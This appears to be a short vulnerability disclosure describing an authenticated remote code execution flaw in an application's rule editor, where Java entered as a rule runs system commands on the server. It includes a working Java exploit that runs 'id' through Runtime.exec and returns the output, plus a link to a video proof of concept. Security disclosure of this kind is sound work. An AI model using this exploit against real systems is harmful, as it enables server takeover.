After logging into the application interface with the admin user, access was provided to the "Rules --> New Rule" form field.

![Vulnerability Proof](image.png)

By using the Runtime.getRuntime().exec() method in the "Java Code" field, codes containing system commands are processed on the server side, causing a remote code execution vulnerability.
![Exploitation Process](proof.png)

## 💻 Exploit Code
```java
import org.json.simple.*;

JSONObject jsonObject = new JSONObject();

try {
    // Runtime ile komut çalıştır
    Runtime runtime = Runtime.getRuntime();
    Process process = runtime.exec("id");
    
    java.io.BufferedReader reader = new java.io.BufferedReader(
        new java.io.InputStreamReader(process.getInputStream())
    );
    
    String line;
    StringBuilder output = new StringBuilder();
    while((line = reader.readLine()) != null) {
        output.append(line).append("\n");
        logger.info("OUTPUT: " + line);
    }
    
    jsonObject.put("status", "SUCCESS");
    jsonObject.put("output", output.toString());
    
} catch(Exception e) {
    logger.error("Error", e);
    jsonObject.put("status", "FAILED");
    jsonObject.put("error", e.getMessage());
}

return jsonObject;
```

----VIDEO POC----

https://github.com/GTxNoMercy00/Magarsus-IDA---RCE/blob/main/proof_iga.mp4


